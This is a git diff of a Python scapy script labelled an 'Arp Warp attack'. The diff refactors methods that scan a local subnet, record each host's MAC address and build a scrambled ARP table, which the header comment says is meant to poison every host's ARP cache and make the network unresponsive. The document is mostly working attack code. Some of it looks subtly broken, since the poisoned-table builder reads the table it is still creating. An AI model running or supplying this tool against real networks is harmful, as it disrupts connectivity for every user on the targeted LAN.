@@ -1,11 +1,12 @@
 import threading
 import time
 
+from scapy.layers.l2 import ARP, Ether
 from scapy.all import *
 
 #   --------------------------------------------------------------------------------------------------------------------
 #
-#   Arp Warp attack - Continously poison the ARP table of all hosts on the connected table, and thus make it unresponsive
+#   Arp Warp attack - Continously poison the ARP table of all hosts on the connected table to make it unresponsive
 #
 #   Notes
 #       * 
@@ -30,33 +31,34 @@ class ArpWarp:
         self.subnet = self.my_private_ip.split(".")[:3]
         self.subnet_range = range(0, 256)
 
-        self.original_arp_table = self.gather_original_table()
+        self.original_arp_table = dict()
+        self.gather_original_table()
         self.scrambled_arp_table = self.generate_poisoned_arp_table()
 
         self.finished = False
 
-    def gather_original_table(self, tested_ip):
+    def get_original_arp_entry(self, tested_ip):
         arp_packet = ARP(op=1, psrc=self.my_private_ip, hwsrc=self.my_mac, pdst=tested_ip)
         arp_res = srp1(Ether() / arp_packet, timeout=2, iface=self.network_interface)
         if arp_res:
             print(f"[+] HOST IS UP {tested_ip} -> {arp_res[ARP].hwsrc}")
             self.original_arp_table[tested_ip] = arp_res[ARP].hwsrc
 
-    def run_scanner(self):
-        print(f"[*] Running scanner for subnet {'.'.join(self.subnet)}.x")
+    def gather_original_table(self):
+        print(f"[*] Generating original ARP table for subnet {'.'.join(self.subnet)}.x")
         temp_threads_list = list()
 
         for host_part in self.subnet_range:
             ip = ".".join(self.subnet + [str(host_part)])
             if ip != self.my_private_ip:
-                t = threading.Thread(target=self.send_arp_packet, args=(ip,))
+                t = threading.Thread(target=self.get_original_arp_entry, args=(ip,))
                 temp_threads_list.append(t)
                 t.start()
 
-        print(f"[*] Sent all packets, waiting for responses...")
+        print(f"[*] Waiting for all ARP requests to finish...")
         for t in temp_threads_list:
             t.join()
-        print(f"[*] Finished scanning")
+        print(f"[*] All original ARP entries have been retrieved")
 
     def generate_poisoned_arp_table(self):
         """
@@ -66,13 +68,13 @@ class ArpWarp:
         table_size = len(self.original_arp_table)
         spoofed_values = [list(self.original_arp_table.values())[i - 1] for i in range(table_size)]
 
-        print(f"[*] Preparing poisoned table...")
+        print(f"[*] Preparing poisoned ARP table...")
         for index, host_ip in enumerate(self.original_arp_table.keys()):
             poisoned_table[host_ip] = spoofed_values[index]
             print(f"[*] Host {host_ip}\toriginal {self.original_arp_table[host_ip]}"
                   f"\t spoofed {self.scrambled_arp_table[host_ip]}")
 
-        print(f"[*] Poisoned table is ready")
+        print(f"[*] Poisoned ARP table is ready")
         return poisoned_table
 
     def poison_arp(self):
